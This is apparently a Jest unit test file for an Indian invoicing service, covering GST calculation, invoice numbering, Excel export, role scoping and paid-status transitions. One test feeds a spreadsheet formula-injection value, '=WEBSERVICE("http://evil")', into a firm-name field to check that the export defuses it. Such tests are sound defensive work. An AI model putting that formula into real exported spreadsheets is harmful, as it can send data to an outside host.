/**
 * Unit tests for InvoicesService (P6.7) and invoice.helpers.ts.
 *
 * Covers:
 *  - computeGST: intra-state (CGST+SGST), inter-state (IGST), unregistered (no GST),
 *    composite (no GST), null GSTIN (no GST).
 *  - generateInvoiceNumber: format + zero-padding.
 *  - generateForPeriod: idempotent generation, KYC-incomplete skip, happy path.
 *  - updateInvoiceNumber: validation + GENERATED-only lock + uniqueness 409.
 *  - markPaid: transitions + idempotent re-call.
 *
 * Run: npx jest src/invoices/invoices.service.spec.ts
 */

import { Test, TestingModule } from '@nestjs/testing';
import {
  ConflictException,
  ForbiddenException,
  NotFoundException,
} from '@nestjs/common';
import { Prisma } from '@prisma/client';
import { InvoicesService } from './invoices.service';
import { PrismaService } from '../prisma/prisma.service';
import { JwtPayload } from '../common/decorators/current-user.decorator';
import {
  computeGST,
  generateInvoiceNumber,
  formatPeriodLabel,
  buildInvoiceDescription,
  buildInvoiceExportXlsx,
  buildInvoiceUploadTemplate,
  type InvoiceExportRow,
} from './invoice.helpers';
import { GenerateInvoicesDto, UpdateInvoiceNumberDto } from './dto/invoices.dto';
import * as XLSX from 'xlsx';

/** Read a built workbook Buffer back into per-sheet array-of-objects (round-trip). */
function readWorkbook(buffer: Buffer): Record<string, Record<string, unknown>[]> {
  const wb = XLSX.read(buffer, { type: 'buffer' });
  const out: Record<string, Record<string, unknown>[]> = {};
  for (const name of wb.SheetNames) {
    out[name] = XLSX.utils.sheet_to_json(wb.Sheets[name], { defval: '' });
  }
  return out;
}

// ── Helper unit tests ─────────────────────────────────────────────────────────

describe('computeGST', () => {
  const BASE = 500000n; // ₹5,000.00 in paise

  it('intra-state (WB GSTIN starting 19) → CGST_SGST, each 9%, total 18%', () => {
    const result = computeGST(BASE, 'REGULAR', '19ABCDE1234F1Z5');
    expect(result.gstApplicable).toBe(true);
    expect(result.gstType).toBe('CGST_SGST');
    // 9% of 500000 = 45000, twice = 90000
    expect(result.gstPaise).toBe(90000n);
    expect(result.totalPaise).toBe(590000n);
  });

  it('inter-state (non-WB GSTIN starting 27) → IGST 18%', () => {
    const result = computeGST(BASE, 'REGULAR', '27ABCDE1234F1Z5');
    expect(result.gstApplicable).toBe(true);
    expect(result.gstType).toBe('IGST');
    // 18% of 500000 = 90000
    expect(result.gstPaise).toBe(90000n);
    expect(result.totalPaise).toBe(590000n);
  });

  it('UNREGISTERED → no GST regardless of state', () => {
    const result = computeGST(BASE, 'UNREGISTERED', '19ABCDE1234F1Z5');
    expect(result.gstApplicable).toBe(false);
    expect(result.gstType).toBeNull();
    expect(result.gstPaise).toBe(0n);
    expect(result.totalPaise).toBe(BASE);
  });

  it('COMPOSITE → no GST', () => {
    const result = computeGST(BASE, 'COMPOSITE', '19ABCDE1234F1Z5');
    expect(result.gstApplicable).toBe(false);
    expect(result.gstType).toBeNull();
    expect(result.gstPaise).toBe(0n);
    expect(result.totalPaise).toBe(BASE);
  });

  it('null GSTIN → no GST even if REGULAR', () => {
    const result = computeGST(BASE, 'REGULAR', null);
    expect(result.gstApplicable).toBe(false);
    expect(result.gstType).toBeNull();
    expect(result.gstPaise).toBe(0n);
    expect(result.totalPaise).toBe(BASE);
  });

  it('paise rounding: 1 paise base, intra → rounds each component to nearest paise', () => {
    const tiny = 1n;
    const result = computeGST(tiny, 'REGULAR', '19ABCDE1234F1Z5');
    // 9% of 1 = 0.09 → rounds to 0; total gst = 0, total = 1
    expect(result.gstPaise).toBe(0n);
    expect(result.totalPaise).toBe(1n);
  });

  it('paise rounding: inter-state, base=1n → igst rounds to 0', () => {
    const result = computeGST(1n, 'REGULAR', '27ABCDE1234F1Z5');
    expect(result.gstPaise).toBe(0n);
    expect(result.totalPaise).toBe(1n);
  });

  it('paise rounding: inter-state, base=100n → igst = 18', () => {
    const result = computeGST(100n, 'REGULAR', '27ABCDE1234F1Z5');
    expect(result.gstPaise).toBe(18n);
    expect(result.totalPaise).toBe(118n);
  });
});

describe('generateInvoiceNumber', () => {
  it('formats correctly with zero-padded seq', () => {
    expect(generateInvoiceNumber('O2', '2025-01', 1)).toBe('TGSL-VIS-O2-202501-001');
    expect(generateInvoiceNumber('O2', '2025-01', 42)).toBe('TGSL-VIS-O2-202501-042');
    expect(generateInvoiceNumber('O2', '2025-01', 999)).toBe('TGSL-VIS-O2-202501-999');
  });

  it('uppercases the outlet code', () => {
    expect(generateInvoiceNumber('abc', '2025-01', 1)).toBe('TGSL-VIS-ABC-202501-001');
  });
});

describe('formatPeriodLabel', () => {
  it('converts YYYY-MM to Month YYYY', () => {
    // en-IN locale may render differently; test the structure.
    const label = formatPeriodLabel('2025-01');
    expect(label).toContain('2025');
    expect(label.toLowerCase()).toContain('january');
  });
});

describe('buildInvoiceDescription', () => {
  it('formats the description string', () => {
    expect(buildInvoiceDescription('January 2025')).toBe(
      'Marketing visibility services — January 2025',
    );
  });
});

// ── Excel round-trip (#44) ─────────────────────────────────────────────────────

describe('buildInvoiceExportXlsx', () => {
  const cgstSgstRow: InvoiceExportRow = {
    invoiceNumber: 'TGSL-VIS-O1-202501-001',
    outletCode: 'O1',
    period: '2025-01',
    invoiceDate: new Date('2025-01-15T00:00:00Z'),
    status: 'GENERATED',
    subtotalPaise: 500000n, // ₹5,000.00
    gstPaise: 90000n, // ₹900.00
    gstType: 'CGST_SGST',
    totalPaise: 590000n, // ₹5,900.00
    snapshot: {
      outletName: 'Sharma Kirana',
      firmName: 'Sharma Enterprises',
      panNumber: 'ABCPS1234D',
      retailerState: 'West Bengal',
      retailerGstin: '19ABCPS1234D1Z5',
    },
  };

  it('renders paise → ₹ with 2 decimals (no float drift)', () => {
    const { buffer } = buildInvoiceExportXlsx([cgstSgstRow], 'January 2025');
    const sheets = readWorkbook(buffer);
    const row = sheets['Invoices'][0];
    expect(row['Subtotal (₹)']).toBe('5000.00');
    expect(row['Total GST (₹)']).toBe('900.00');
    expect(row['Total (₹)']).toBe('5900.00');
  });

  it('splits CGST_SGST gst into equal CGST + SGST that sum back to gstPaise', () => {
    const { buffer } = buildInvoiceExportXlsx([cgstSgstRow]);
    const row = readWorkbook(buffer)['Invoices'][0];
    expect(row['CGST (₹)']).toBe('450.00');
    expect(row['SGST (₹)']).toBe('450.00');
    expect(row['IGST (₹)']).toBe('0.00');
    expect(row['GST Type']).toBe('CGST_SGST');
  });

  it('odd-paise gst split: remainder lands on CGST so CGST+SGST === gstPaise', () => {
    const oddRow: InvoiceExportRow = {
      ...cgstSgstRow,
      gstPaise: 901n, // ₹9.01 — odd paise
      subtotalPaise: 5006n,
      totalPaise: 5907n,
    };
    const row = readWorkbook(buildInvoiceExportXlsx([oddRow]).buffer)['Invoices'][0];
    // 901 → CGST 451 (4.51) + SGST 450 (4.50) = 901
    expect(row['CGST (₹)']).toBe('4.51');
    expect(row['SGST (₹)']).toBe('4.50');
  });

  it('puts IGST in the IGST column, leaves CGST/SGST at 0', () => {
    const igstRow: InvoiceExportRow = {
      ...cgstSgstRow,
      gstType: 'IGST',
    };
    igstRow.snapshot = { ...cgstSgstRow.snapshot, retailerGstin: '27ABCPS1234D1Z5' };
    const row = readWorkbook(buildInvoiceExportXlsx([igstRow]).buffer)['Invoices'][0];
    expect(row['IGST (₹)']).toBe('900.00');
    expect(row['CGST (₹)']).toBe('0.00');
    expect(row['SGST (₹)']).toBe('0.00');
  });

  it('accepts number-typed paise (post-JSON round-trip) identically to bigint', () => {
    const numberRow: InvoiceExportRow = {
      ...cgstSgstRow,
      subtotalPaise: 500000,
      gstPaise: 90000,
      totalPaise: 590000,
    };
    const row = readWorkbook(buildInvoiceExportXlsx([numberRow]).buffer)['Invoices'][0];
    expect(row['Subtotal (₹)']).toBe('5000.00');
    expect(row['Total (₹)']).toBe('5900.00');
  });

  it('neutralises spreadsheet formula injection in partner-supplied cells', () => {
    const evilRow: InvoiceExportRow = {
      ...cgstSgstRow,
      snapshot: {
        ...cgstSgstRow.snapshot,
        firmName: '=WEBSERVICE("http://evil")',
        outletName: '+1+1',
      },
    };
    const row = readWorkbook(buildInvoiceExportXlsx([evilRow]).buffer)['Invoices'][0];
    // Leading =/+ are defused with a leading apostrophe → Excel treats them as text.
    expect(row['Firm Name']).toBe('\'=WEBSERVICE("http://evil")');
    expect(row['Outlet Name']).toBe("'+1+1");
  });

  it('summary sheet totals are the paise sums rendered in ₹', () => {
    const second: InvoiceExportRow = {
      ...cgstSgstRow,
      invoiceNumber: 'TGSL-VIS-O2-202501-002',
      outletCode: 'O2',
      subtotalPaise: 300000n,
      gstPaise: 0n,
      gstType: null,
      totalPaise: 300000n,
    };
    const { buffer } = buildInvoiceExportXlsx([cgstSgstRow, second]);
    const summary = readWorkbook(buffer)['Summary'];
    const byField = Object.fromEntries(summary.map((r) => [r.Field, r.Value]));
    expect(byField['Total Invoices']).toBe(2);
    expect(byField['Total Subtotal (₹)']).toBe('8000.00'); // 5000 + 3000
    expect(byField['Total GST (₹)']).toBe('900.00');
    expect(byField['Total Invoice Value (₹)']).toBe('8900.00'); // 5900 + 3000
  });

  it('empty set still emits a labelled (header-only) Invoices sheet + summary', () => {
    const { buffer } = buildInvoiceExportXlsx([]);
    const sheets = readWorkbook(buffer);
    // No data rows, but the header row keys exist on the worksheet.
    const headerKeys = Object.keys(
      XLSX.utils.sheet_to_json(
        XLSX.read(buffer, { type: 'buffer' }).Sheets['Invoices'],
        { header: 1 },
      )[0] as Record<string, unknown>,
    );
    expect(headerKeys.length).toBeGreaterThan(0);
    const summary = sheets['Summary'];
    const byField = Object.fromEntries(summary.map((r) => [r.Field, r.Value]));
    expect(byField['Total Invoices']).toBe(0);
    expect(byField['Total Invoice Value (₹)']).toBe('0.00');
  });
});

describe('buildInvoiceUploadTemplate', () => {
  it('produces a parseable xlsx with the documented period columns', () => {
    const buffer = buildInvoiceUploadTemplate();
    const wb = XLSX.read(buffer, { type: 'buffer' });
    const aoa = XLSX.utils.sheet_to_json(wb.Sheets[wb.SheetNames[0]], {
      header: 1,
    }) as unknown[][];
    expect(aoa[0]).toEqual(['Period (YYYY-MM)', 'Outlet Code (optional)']);
  });
});

// ── InvoicesService tests ─────────────────────────────────────────────────────

// ── Mock Prisma TX ─────────────────────────────────────────────────────────────
const mockTx = {
  autoInvoice: {
    upsert: jest.fn(),
    findFirst: jest.fn(),
    update: jest.fn(),
  },
};

// ── Mock Prisma ────────────────────────────────────────────────────────────────
const mockPrisma = {
  creditField: { findMany: jest.fn() },
  creditPayoutEntry: { findMany: jest.fn() },
  outlet: { findMany: jest.fn() },
  channelPartner: { findFirst: jest.fn() },
  autoInvoice: {
    count: jest.fn(),
    findMany: jest.fn(),
    findFirst: jest.fn(),
    update: jest.fn(),
    create: jest.fn(),
    updateMany: jest.fn(),
  },
  $transaction: jest.fn(async (cb: (tx: typeof mockTx) => unknown) => cb(mockTx)),
};

// ── Fixtures ──────────────────────────────────────────────────────────────────

const admin: JwtPayload = {
  sub: 'admin1',
  role: 'CLIENT_ADMIN',
  clientId: 'deoleo',
  phone: '',
  name: '',
};

const gifsy: JwtPayload = {
  sub: 'g1',
  role: 'GIFSY_ADMIN',
  clientId: 'deoleo',
  phone: '',
  name: '',
};

const partnerUser: JwtPayload = {
  sub: 'partner1',
  role: 'PARTNER',
  clientId: 'deoleo',
  phone: '',
  name: '',
};

/** A KYC-complete REGULAR WB outlet fixture. */
const kycApprovedWBOutlet = {
  outletCode: 'O1',
  name: 'Test Store',
  state: 'West Bengal',
  partnerId: 'p1',
  partner: {
    id: 'p1',
    businessName: 'Test Enterprises',
    ownerName: 'Rajesh',
    phone: '9999999999',
    panNumber: 'ABCDE1234F',
    gstNumber: '19ABCDE1234F1Z5',
    entityType: 'INDIVIDUAL',
    gstRegistrationType: 'REGULAR',
    bankName: 'SBI',
    bankAccountNumber: '123456789',
    ifscCode: 'SBIN0001234',
    kycSubmissions: [{ status: 'APPROVED' }],
  },
};

// ── describe InvoicesService ───────────────────────────────────────────────────

describe('InvoicesService', () => {
  let service: InvoicesService;

  beforeEach(async () => {
    jest.clearAllMocks();

    // Default mockPrisma.autoInvoice.count = 0 (no prior invoices in this period)
    mockPrisma.autoInvoice.count.mockResolvedValue(0);

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        InvoicesService,
        { provide: PrismaService, useValue: mockPrisma },
      ],
    }).compile();
    service = module.get(InvoicesService);
  });

  // ── generateForPeriod ────────────────────────────────────────────────────────

  describe('generateForPeriod', () => {
    it('returns early if no separate-payout fields exist', async () => {
      mockPrisma.creditField.findMany.mockResolvedValue([]);

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
      expect(mockPrisma.creditPayoutEntry.findMany).not.toHaveBeenCalled();
    });

    it('returns early if no payout entries for the period', async () => {
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([]);

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
    });

    it('generates an invoice for a KYC-approved REGULAR WB outlet (intra-state CGST_SGST)', async () => {
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 500000n }, // ₹5,000
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([kycApprovedWBOutlet]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);
      mockPrisma.autoInvoice.create.mockResolvedValue({ id: 'inv1' });

      const result = await service.generateForPeriod(admin, { period: '2025-01' });

      expect(result.generated).toBe(1);
      expect(result.skipped).toHaveLength(0);

      const createData = mockPrisma.autoInvoice.create.mock.calls[0][0].data;
      // Verify GST computed as CGST_SGST (WB intra-state)
      expect(createData.gstType).toBe('CGST_SGST');
      expect(createData.subtotalPaise).toBe(500000n);
      // 9% + 9% = 90000 paise
      expect(createData.gstPaise).toBe(90000n);
      expect(createData.totalPaise).toBe(590000n);
      expect(createData.invoiceNumber).toMatch(/^TGSL-VIS-O1-202501-001$/);
      expect(createData.status).toBe('GENERATED');
      expect(createData.invoiceNumberEdited).toBe(false);
    });

    it('generates invoice with IGST for inter-state (non-WB GSTIN)', async () => {
      const interStateOutlet = {
        ...kycApprovedWBOutlet,
        state: 'Maharashtra',
        partner: {
          ...kycApprovedWBOutlet.partner,
          gstNumber: '27ABCDE1234F1Z5', // Maharashtra state code 27
        },
      };
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n }, // ₹1,000
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([interStateOutlet]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);
      mockPrisma.autoInvoice.create.mockResolvedValue({ id: 'inv2' });

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(1);

      const createData = mockPrisma.autoInvoice.create.mock.calls[0][0].data;
      expect(createData.gstType).toBe('IGST');
      // 18% of 100000 = 18000
      expect(createData.gstPaise).toBe(18000n);
      expect(createData.totalPaise).toBe(118000n);
    });

    it('generates invoice with no GST for UNREGISTERED outlet', async () => {
      const unregisteredOutlet = {
        ...kycApprovedWBOutlet,
        partner: {
          ...kycApprovedWBOutlet.partner,
          gstRegistrationType: 'UNREGISTERED',
          gstNumber: null,
        },
      };
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 200000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([unregisteredOutlet]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);
      mockPrisma.autoInvoice.create.mockResolvedValue({ id: 'inv3' });

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(1);

      const createData = mockPrisma.autoInvoice.create.mock.calls[0][0].data;
      expect(createData.gstType).toBeNull();
      expect(createData.gstPaise).toBe(0n);
      expect(createData.totalPaise).toBe(200000n);
    });

    it('skips outlet whose KYC is not APPROVED', async () => {
      const notApprovedOutlet = {
        ...kycApprovedWBOutlet,
        partner: {
          ...kycApprovedWBOutlet.partner,
          kycSubmissions: [{ status: 'PENDING_GIFSY' }],
        },
      };
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([notApprovedOutlet]);

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
      expect(result.skipped).toHaveLength(1);
      expect(result.skipped[0].outletCode).toBe('O1');
      expect(result.skipped[0].reason).toMatch(/KYC not approved/i);
      expect(mockPrisma.autoInvoice.create).not.toHaveBeenCalled();
    });

    it('skips outlet with no KYC submission at all', async () => {
      const noKycOutlet = {
        ...kycApprovedWBOutlet,
        partner: {
          ...kycApprovedWBOutlet.partner,
          kycSubmissions: [],
        },
      };
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([noKycOutlet]);

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
      expect(result.skipped[0].reason).toMatch(/KYC not approved/i);
    });

    it('skips outlet missing panNumber', async () => {
      const noPanOutlet = {
        ...kycApprovedWBOutlet,
        partner: { ...kycApprovedWBOutlet.partner, panNumber: null },
      };
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([noPanOutlet]);

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
      expect(result.skipped[0].reason).toMatch(/panNumber/);
    });

    it('skips REGULAR outlet missing gstNumber', async () => {
      const noGstOutlet = {
        ...kycApprovedWBOutlet,
        partner: { ...kycApprovedWBOutlet.partner, gstNumber: null },
      };
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([noGstOutlet]);

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
      expect(result.skipped[0].reason).toMatch(/REGULAR GST retailer missing gstNumber/);
    });

    it('is idempotent: a re-run refreshes a still-GENERATED invoice (create conflict → guarded updateMany)', async () => {
      mockPrisma.autoInvoice.count.mockResolvedValue(1);
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 500000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([kycApprovedWBOutlet]);
      // create hits the composite unique → P2002; the still-GENERATED row is refreshed.
      const p2002 = new Prisma.PrismaClientKnownRequestError('Unique constraint failed', {
        code: 'P2002',
        clientVersion: '5.0.0',
      });
      mockPrisma.autoInvoice.create.mockRejectedValue(p2002);
      // The disambiguation read finds THIS outlet's existing row → tuple conflict.
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({ id: 'inv1' });
      mockPrisma.autoInvoice.updateMany.mockResolvedValue({ count: 1 });

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(1);
      // The guarded refresh targets ONLY status:'GENERATED'.
      const where = mockPrisma.autoInvoice.updateMany.mock.calls[0][0].where;
      expect(where.status).toBe('GENERATED');
      expect(where.outletCode).toBe('O1');
    });

    it('does NOT mutate a PAID (finalized) invoice on re-run — guarded updateMany skips it', async () => {
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([kycApprovedWBOutlet]);
      mockPrisma.autoInvoice.count.mockResolvedValue(1);

      const p2002 = new Prisma.PrismaClientKnownRequestError('Unique constraint failed', {
        code: 'P2002',
        clientVersion: '5.0.0',
      });
      mockPrisma.autoInvoice.create.mockRejectedValue(p2002);
      // The disambiguation read finds the row (tuple conflict); but it is PAID →
      // the status:'GENERATED' guard matches 0 rows.
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({ id: 'inv1' });
      mockPrisma.autoInvoice.updateMany.mockResolvedValue({ count: 0 });

      const result = await service.generateForPeriod(admin, { period: '2025-01' });
      expect(result.generated).toBe(0);
      expect(result.skipped).toHaveLength(1);
      expect(result.skipped[0].reason).toMatch(/finalized|PAID/i);
      // Proof the refresh was guarded on GENERATED (so a PAID row is never written).
      expect(mockPrisma.autoInvoice.updateMany.mock.calls[0][0].where.status).toBe('GENERATED');
    });

    it('AF-8: retries with the next sequence on a GLOBAL invoiceNumber collision — never skips the outlet', async () => {
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([kycApprovedWBOutlet]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      // P2002 on create — the GLOBAL invoiceNumber collided. The disambiguation read
      // finds NO row for this outlet's tuple → it's a number collision, not a re-run.
      const numberClash = new Prisma.PrismaClientKnownRequestError('Unique constraint failed', {
        code: 'P2002',
        clientVersion: '5.0.0',
      });
      mockPrisma.autoInvoice.findFirst.mockResolvedValue(null); // tuple absent
      // First number (…-001) is taken; the retry (…-002) succeeds.
      mockPrisma.autoInvoice.create
        .mockRejectedValueOnce(numberClash)
        .mockResolvedValueOnce({ id: 'inv-retry' });

      const result = await service.generateForPeriod(admin, { period: '2025-01' });

      expect(result.generated).toBe(1);
      expect(result.skipped).toHaveLength(0);
      expect(mockPrisma.autoInvoice.create).toHaveBeenCalledTimes(2);
      // The retry advanced the sequence rather than skipping the outlet (AF-8).
      expect(mockPrisma.autoInvoice.create.mock.calls[0][0].data.invoiceNumber).toBe('TGSL-VIS-O1-202501-001');
      expect(mockPrisma.autoInvoice.create.mock.calls[1][0].data.invoiceNumber).toBe('TGSL-VIS-O1-202501-002');
      // A number collision must NOT trigger the tuple-refresh path.
      expect(mockPrisma.autoInvoice.updateMany).not.toHaveBeenCalled();
    });

    it('AF-8: gives up gracefully (skips, no infinite loop) if every number stays colliding', async () => {
      mockPrisma.creditField.findMany.mockResolvedValue([{ id: 'f1' }]);
      mockPrisma.creditPayoutEntry.findMany.mockResolvedValue([
        { outletId: 'O1', amountPaise: 100000n },
      ]);
      mockPrisma.outlet.findMany.mockResolvedValue([kycApprovedWBOutlet]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      const numberClash = new Prisma.PrismaClientKnownRequestError('Unique constraint failed', {
        code: 'P2002',
        clientVersion: '5.0.0',
      });
      mockPrisma.autoInvoice.findFirst.mockResolvedValue(null); // tuple never exists → always a number collision
      mockPrisma.autoInvoice.create.mockRejectedValue(numberClash); // always collides

      const result = await service.generateForPeriod(admin, { period: '2025-01' });

      expect(result.generated).toBe(0);
      expect(result.skipped).toHaveLength(1);
      expect(result.skipped[0].reason).toMatch(/unique invoice number/i);
      // Bounded retry — not an unbounded loop.
      expect(mockPrisma.autoInvoice.create.mock.calls.length).toBeLessThanOrEqual(60);
      // updateMany (tuple-refresh) must never fire for a pure number collision.
      expect(mockPrisma.autoInvoice.updateMany).not.toHaveBeenCalled();
    });
  });

  // ── updateInvoiceNumber ───────────────────────────────────────────────────────

  describe('updateInvoiceNumber', () => {
    const dto: UpdateInvoiceNumberDto = { invoiceNumber: 'TGSL-VIS-O1-202501-099' };

    it('updates the number and sets invoiceNumberEdited = true', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        partnerId: 'p1',
        status: 'GENERATED',
      });
      mockPrisma.autoInvoice.update.mockResolvedValue({
        id: 'inv1',
        invoiceNumber: 'TGSL-VIS-O1-202501-099',
        invoiceNumberEdited: true,
      });

      const result = await service.updateInvoiceNumber(admin, 'inv1', dto);
      expect(result.invoiceNumberEdited).toBe(true);
      const updateData = mockPrisma.autoInvoice.update.mock.calls[0][0].data;
      expect(updateData.invoiceNumber).toBe('TGSL-VIS-O1-202501-099');
      expect(updateData.invoiceNumberEdited).toBe(true);
    });

    it('trims and uppercases the number before persisting', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        partnerId: 'p1',
        status: 'GENERATED',
      });
      mockPrisma.autoInvoice.update.mockResolvedValue({ id: 'inv1', invoiceNumberEdited: true });

      // Service normalises: trim + toUpperCase before persisting.
      const dtoLower: UpdateInvoiceNumberDto = { invoiceNumber: '  tgsl-vis-o1-202501-099  ' };
      await service.updateInvoiceNumber(admin, 'inv1', dtoLower);
      const updateData = mockPrisma.autoInvoice.update.mock.calls[0][0].data;
      expect(updateData.invoiceNumber).toBe('TGSL-VIS-O1-202501-099');
    });

    it('throws NotFoundException when invoice not found or outside tenant', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue(null);
      await expect(
        service.updateInvoiceNumber(admin, 'ghost', dto),
      ).rejects.toBeInstanceOf(NotFoundException);
    });

    it('throws 409 when status is PAID (locked)', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        partnerId: 'p1',
        status: 'PAID',
      });
      await expect(
        service.updateInvoiceNumber(admin, 'inv1', dto),
      ).rejects.toBeInstanceOf(ConflictException);
    });

    it('throws 409 when invoice number already in use (P2002)', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        partnerId: 'p1',
        status: 'GENERATED',
      });
      const p2002 = new Prisma.PrismaClientKnownRequestError('Unique constraint', {
        code: 'P2002',
        clientVersion: '5.0.0',
      });
      mockPrisma.autoInvoice.update.mockRejectedValue(p2002);

      await expect(
        service.updateInvoiceNumber(admin, 'inv1', dto),
      ).rejects.toBeInstanceOf(ConflictException);
    });

    it('partner cannot edit another partner invoice (ForbiddenException)', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        partnerId: 'p-OTHER',
        status: 'GENERATED',
      });
      // caller resolves to partner 'p1'
      mockPrisma.channelPartner.findFirst.mockResolvedValue({ id: 'p1' });

      await expect(
        service.updateInvoiceNumber(partnerUser, 'inv1', dto),
      ).rejects.toBeInstanceOf(ForbiddenException);
    });

    it('partner can edit their OWN invoice', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        partnerId: 'p1',
        status: 'GENERATED',
      });
      mockPrisma.channelPartner.findFirst.mockResolvedValue({ id: 'p1' });
      mockPrisma.autoInvoice.update.mockResolvedValue({ id: 'inv1', invoiceNumberEdited: true });

      const result = await service.updateInvoiceNumber(partnerUser, 'inv1', dto);
      expect(result.invoiceNumberEdited).toBe(true);
    });
  });

  // ── markPaid ─────────────────────────────────────────────────────────────────

  describe('markPaid', () => {
    it('transitions GENERATED → PAID', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        status: 'GENERATED',
      });
      mockPrisma.autoInvoice.update.mockResolvedValue({
        id: 'inv1',
        status: 'PAID',
      });

      const result = await service.markPaid(gifsy, 'inv1');
      expect(result.status).toBe('PAID');
      const updateData = mockPrisma.autoInvoice.update.mock.calls[0][0].data;
      expect(updateData.status).toBe('PAID');
    });

    it('is idempotent: re-calling on a PAID invoice returns no-op result', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue({
        id: 'inv1',
        clientId: 'deoleo',
        status: 'PAID',
      });

      const result = await service.markPaid(gifsy, 'inv1') as { message?: string };
      expect(result.message).toMatch(/no-op/i);
      expect(mockPrisma.autoInvoice.update).not.toHaveBeenCalled();
    });

    it('throws NotFoundException when invoice not found', async () => {
      mockPrisma.autoInvoice.findFirst.mockResolvedValue(null);
      await expect(service.markPaid(gifsy, 'ghost')).rejects.toBeInstanceOf(NotFoundException);
    });
  });

  // ── list ─────────────────────────────────────────────────────────────────────

  describe('list', () => {
    it('scopes to the tenant clientId for admin', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      await service.list(admin, {});
      const where = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      expect(where.clientId).toBe('deoleo');
      expect(where.partnerId).toBeUndefined();
    });

    it('additionally scopes to partnerId for partner roles', async () => {
      mockPrisma.channelPartner.findFirst.mockResolvedValue({ id: 'p1' });
      mockPrisma.autoInvoice.findMany.mockResolvedValue([]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      await service.list(partnerUser, {});
      const where = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      expect(where.partnerId).toBe('p1');
    });

    it('applies period + status + outletCode filters', async () => {
      mockPrisma.autoInvoice.findMany.mockResolvedValue([]);
      mockPrisma.autoInvoice.count.mockResolvedValue(0);

      await service.list(admin, { period: '2025-01', status: 'PAID', outletCode: 'O1' });
      const where = mockPrisma.autoInvoice.findMany.mock.calls[0][0].where;
      expect(where.period).toBe('2025-01');
      expect(where.status).toBe('PAID');
